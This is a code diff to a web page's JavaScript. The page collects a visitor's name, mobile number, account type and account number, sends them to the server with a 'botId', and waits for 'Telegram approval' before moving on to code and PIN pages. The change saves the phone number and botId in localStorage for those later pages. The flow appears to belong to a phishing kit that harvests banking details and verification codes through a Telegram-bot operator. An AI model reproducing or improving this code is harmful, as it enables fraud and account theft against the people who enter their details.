@@ -742,6 +742,7 @@
         // 1. SESSION HANDLING
         // ============================================================
 
+        // ✅ SAVE botId to localStorage (for use on code.html, pin.html, etc.)
         const params = new URLSearchParams(window.location.search);
         const botId = params.get('botId') || localStorage.getItem('botId');
         if (botId) {
@@ -864,7 +865,8 @@
 
 
         // ============================================================
-        // 5. NEXT PAGE – sends ONLY name, mobileNumber (from input), accountType, accountNumber
+        // 5. NEXT PAGE – sends ONLY name, mobileNumber, accountType, accountNumber
+        //     AND saves phone + botId to localStorage for next pages
         // ============================================================
 
         async function nextPage() {
@@ -923,17 +925,24 @@
             waitingMessage.style.display = 'block';
 
 
-            // --- 5d. Send ONLY the 4 required fields to the server ---
-            //     mobileNumber is taken from the input field, NOT from localStorage
+            // --- 5d. Save phone to localStorage so code.html can access it ---
+            // ✅ FIX: This ensures the phone number entered here is used by subsequent pages
+            localStorage.setItem('phone', mobileNumber);
+
+            // botId is already saved at the top of this script, but let's ensure it's set
+            localStorage.setItem('botId', botId);
+
+
+            // --- 5e. Send ONLY the 4 required fields to the server ---
 
             try {
 
                 const payload = {
                     name: fullName,               // from localStorage
-                    phone: mobileNumber,          // ✅ from the input field on this page
+                    phone: mobileNumber,          // from the input field on this page
                     accountType: accountType,
                     accountNumber: accountNumber,
-                    botId: botId
+                    botId: botId                  // passed to server so the bot knows which bot to send to
                 };
 
                 const response = await fetch(`${window.location.origin}/submit-account`, {
@@ -948,7 +957,7 @@
                     throw new Error("Missing requestId from server");
                 }
 
-                // --- 5e. Start polling for Telegram approval ---
+                // --- 5f. Start polling for Telegram approval ---
                 pollAccountApproval(data.requestId);
 
             } catch (err) {
